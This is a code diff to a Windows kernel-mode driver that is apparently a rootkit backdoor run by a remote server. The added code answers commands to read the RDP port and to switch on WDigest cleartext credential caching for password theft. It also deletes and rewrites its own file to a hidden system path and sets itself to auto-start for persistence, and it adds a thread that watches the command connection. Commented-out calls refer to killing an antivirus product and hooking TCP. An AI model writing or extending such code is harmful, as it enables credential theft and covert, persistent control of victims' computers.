@@ -29,15 +29,17 @@ VOID InitializeObjectAttributes(
 #include "system.h"
 #include "network.h"
 #include "xlog.h"
-
+#include "tcphook.h"
 #include "config.h"
 
 PDEVICE_OBJECT g_pCtrlDO = NULL;
 PKTHREAD g_pnThread;
+PKTHREAD g_mnThread;
 //This value should be use in the system thread only
 HANDLE die = FALSE;
 PWSK_SOCKET pSocket = NULL;
-
+DWORD timeoutCounter = 0;
+HANDLE hSelfFile;
 
 
 
@@ -68,11 +70,13 @@ void DriverUnload(PDRIVER_OBJECT pDriverObject) {
 	
 	//stop system thread
 	//set a event?
+	KeWaitForSingleObject(g_mnThread, Executive, KernelMode, FALSE, 0);
 	KeWaitForSingleObject(g_pnThread, Executive, KernelMode, FALSE, 0);
 	ObDereferenceObject(g_pnThread);
+	ObDereferenceObject(g_mnThread);
 	xLog("All Released, Closing Log File");
 	//close log file
-	
+	//UnhookTCP();
 	CloseLogFile();
 }
 
@@ -221,6 +225,8 @@ NTSTATUS DeviceControlDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
 #define CMD_KILL "kill"
 #define CMD_DEL "del"
 #define CMD_REBOOT "reboot"
+#define CMD_QRDP "qrdp"
+#define CMD_SETCLEARTEXT "setct"
 NTSTATUS HandleServerPacket(
 	PCHAR msg,
 	PCHAR pNeedReply
@@ -272,6 +278,51 @@ NTSTATUS HandleServerPacket(
 		KeBugCheck(POWER_FAILURE_SIMULATE);
 	}
 
+	if (strncmp(msg, CMD_QRDP, strlen(CMD_QRDP)) == 0) {
+		//query rdp
+		PKEY_VALUE_PARTIAL_INFORMATION pKvi = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, 400, 'lreg');
+		//UNICODE_STRING uniV;
+		
+		//RtlInitUnicodeString(&uniV, L"ImagePath");
+		status = queryRegA("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", "PortNumber", pKvi, 400);
+		if (NT_SUCCESS(status)) {
+			//xLogL(pKvi->Data, pKvi->DataLength);
+			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "reg read rdp port: %d\n", *((DWORD*)pKvi->Data));
+		}
+		else
+		{
+			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "Reg read Error: 0x%p\n", status);
+		}
+		ExFreePoolWithTag(pKvi, 'lreg');
+		status = STATUS_SUCCESS;
+	}
+	if (strncmp(msg, CMD_SETCLEARTEXT, strlen(CMD_SETCLEARTEXT)) == 0) {
+		//set cleartext
+		DWORD cleartextEn = 1;
+		status = setRegA("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", REG_DWORD, &cleartextEn, sizeof(DWORD));
+		if (!NT_SUCCESS(status)) {
+			//xLogL(pKvi->Data, pKvi->DataLength);
+			goto HANDLER_CMD_END;
+		}
+		PKEY_VALUE_PARTIAL_INFORMATION pKvi = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, 400, 'lreg');
+		//UNICODE_STRING uniV;
+
+		//RtlInitUnicodeString(&uniV, L"ImagePath");
+		status = queryRegA("\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", pKvi, 400);
+		if (NT_SUCCESS(status)) {
+			//xLogL(pKvi->Data, pKvi->DataLength);
+			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "reg read UseLogonCredential key: %d\n", *((DWORD*)pKvi->Data));
+		}
+		else
+		{
+			RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "Reg read Error: 0x%p\n", status);
+		}
+		ExFreePoolWithTag(pKvi, 'lreg');
+		status = STATUS_SUCCESS;
+	}
+	
+
+HANDLER_CMD_END:
 	if (!NT_SUCCESS(status)) {
 		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "Command Execute Failed: 0x%p\n", status);
 	}
@@ -362,7 +413,7 @@ RECV_LOOP:
 		xLog(msg);
 		goto CLOSE_SOCKET;
 	}
-	
+	InterlockedExchange(&timeoutCounter, 0);
 	if (recvBytes < NETBUFF_LENGTH) {
 		msg[recvBytes] = 0;
 		xLog("stage debug ok");
@@ -432,6 +483,29 @@ HALT_THREAD:
 	return STATUS_SUCCESS;
 }
 
+NTSTATUS monitorThreadProc() {
+
+	xLog("Monitor thread started");
+	LARGE_INTEGER timeout2;
+	timeout2.QuadPart = -10 * 1000 * 1000;
+	timeout2.QuadPart *= 2;
+	while (TRUE) {
+		if (die) {
+			break;
+		}
+		if (timeoutCounter >= 30) {
+			if (pSocket != NULL) {
+				CloseSocket(pSocket);
+			}
+			InterlockedExchange(&timeoutCounter, 0);
+		}
+		InterlockedAdd(&timeoutCounter, 1);
+		KeDelayExecutionThread(KernelMode, FALSE, &timeout2);
+	}
+	PsTerminateSystemThread(STATUS_SUCCESS);
+	return STATUS_SUCCESS;
+}
+
 NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 	//create devices
@@ -471,10 +545,162 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 	PUNICODE_STRING pusDriverPath = NULL;
 	pusDriverPath = &((PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection)->FullDllName;
 	//pDriverObject->DriverSection
+
+	//Read Self
+	
+	OBJECT_ATTRIBUTES objself;
+	//UNICODE_STRING logPath;
+	IO_STATUS_BLOCK ios;
+	//RtlInitUnicodeString(&logPath, DRIVER_LOG_FILENAME);
+	InitializeObjectAttributes(&objself, pusDriverPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
+	PVOID selfContent = NULL;
+	ULONG selfSize = 0;
+	status = IoCreateFileEx(&hSelfFile,
+		GENERIC_READ,
+		&objself,
+		&ios,
+		NULL,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL,
+		FILE_OPEN,
+		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
+		NULL,
+		0,
+		CreateFileTypeNone,
+		NULL,
+		IO_NO_PARAMETER_CHECKING,
+		NULL);
+
+	if (!NT_SUCCESS(status)) {
+		xLog("open self failed");
+	}
+	else
+	{
+		FILE_STANDARD_INFORMATION fsi;
+		//try read self
+		status = ZwQueryInformationFile(
+			hSelfFile,
+			&ios,
+			&fsi,
+			sizeof(fsi),
+			FileStandardInformation
+
+		);
+		if (!NT_SUCCESS(status)) {
+			xLog("query self info failed");
+			ZwClose(hSelfFile);
+			goto ENTRY_DEL_SELF;
+		}
+		selfSize = fsi.EndOfFile.QuadPart;
+		selfContent = ExAllocatePoolWithTag(NonPagedPool, selfSize, 'self');
+		status = ZwReadFile(
+			hSelfFile,
+			NULL,
+			NULL,
+			NULL,
+			&ios,
+			selfContent,
+			selfSize,
+			NULL,
+			NULL
+		);
+		if (!NT_SUCCESS(status)) {
+			xLog("read self failed");
+		}
+		ZwClose(hSelfFile);
+	}
+	//Delete Self
+	ENTRY_DEL_SELF:
 	DelDriverFile(pusDriverPath);
+	xLogW(pRegistryPath);
+
+	//PKEY_VALUE_PARTIAL_INFORMATION pKvi = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, 400, 'lreg');
+	//UNICODE_STRING uniV;
+	//RtlInitUnicodeString(&uniV, L"ImagePath");
+	//status = queryRegW(pRegistryPath, &uniV, pKvi, 400);
+	//if (NT_SUCCESS(status)) {
+	//	xLogL(pKvi->Data, pKvi->DataLength);
+	//	
+	//}
+	//else
+	//{
+	//	RtlStringCbPrintfA(pKvi, 400, "Reg read Error: 0x%p", status);
+	//	xLog(pKvi);
+	//}
+	//ExFreePoolWithTag(pKvi, 'lreg');
+
+	UNICODE_STRING uniHidPath;
+	RtlInitUnicodeString(&uniHidPath, HIDDEN_PATH);
+	UNICODE_STRING uniV;
+	
+	RtlInitUnicodeString(&uniV, L"Start");
+	DWORD dw2 = 2;
+	if (PRODUCT_MODE) {
+
+		status = setRegW(pRegistryPath, &uniV, REG_DWORD, &dw2, sizeof(dw2));
+	}
+	RtlInitUnicodeString(&uniV, L"ImagePath");
+	RtlStringCbLengthW(HIDDEN_PATH, 1000, &dw2);
+	status = setRegW(pRegistryPath, &uniV, REG_SZ, HIDDEN_PATH, sizeof(HIDDEN_PATH));
+
+
+	if (!NT_SUCCESS(status)) {
+		xLog("failed to set reg image path");
+	}
+	else
+	{
+		if (selfContent != NULL) {
+			xLog("ready to write new self");
+			InitializeObjectAttributes(&objself, &uniHidPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
+			status = IoCreateFile(&hSelfFile,
+				FILE_WRITE_ACCESS | SYNCHRONIZE,
+				&objself,
+				&ios,
+				0,
+				FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN,
+				FILE_SHARE_READ | FILE_SHARE_WRITE,
+				FILE_OPEN_IF,
+				FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
+				NULL,
+				0,
+				CreateFileTypeNone,
+				NULL,
+				0
+			);
+			if (!NT_SUCCESS(status)) {
+				xLog("reopen self write failed");
+			}
+			else
+			{
+				status = ZwWriteFile(
+					hSelfFile,
+					NULL,
+					NULL,
+					NULL,
+					&ios,
+					selfContent,
+					selfSize,
+					NULL,
+					NULL
+				);
+				if (!NT_SUCCESS(status)) {
+					xLog("rewrite self failed");
+				}
+				xLog("rewrite successfully");
+				if (!PRODUCT_MODE) {
+					ZwClose(hSelfFile);
+				}
+				
+			}
+		}
+	}
+	if (selfContent != NULL) {
+		ExFreePoolWithTag(selfContent, 'self');
+	}
+
 	CLIENT_ID       clientId = { 0 };
-	xDel1("C:\\test\\1.txt");
-	kill360_64();
+	//xDel1("C:\\test\\1.txt");
+	//kill360_64();
 	initWsk();
 	//create network system thread
 	xLog("Creating System Thread");
@@ -499,9 +725,30 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 		NULL
 	);
 	ZwClose(hSysThread);
+	//start a monitor thread, to kill the primary thread
+	PsCreateSystemThread(
+		&hSysThread,
+		NULL,
+		NULL,
+		NtCurrentProcess(),
+		&clientId,
+		monitorThreadProc,
+		NULL
+	);
+	//get network systh thread object
+
+	ObReferenceObjectByHandle(
+		hSysThread,
+		THREAD_ALL_ACCESS,
+		NULL,
+		KernelMode,
+		&g_mnThread,
+		NULL
+	);
+	ZwClose(hSysThread);
 
 	xLog("DriverEntry Finished");
-	
+	//InstallHook();
 	return status;
 }
 
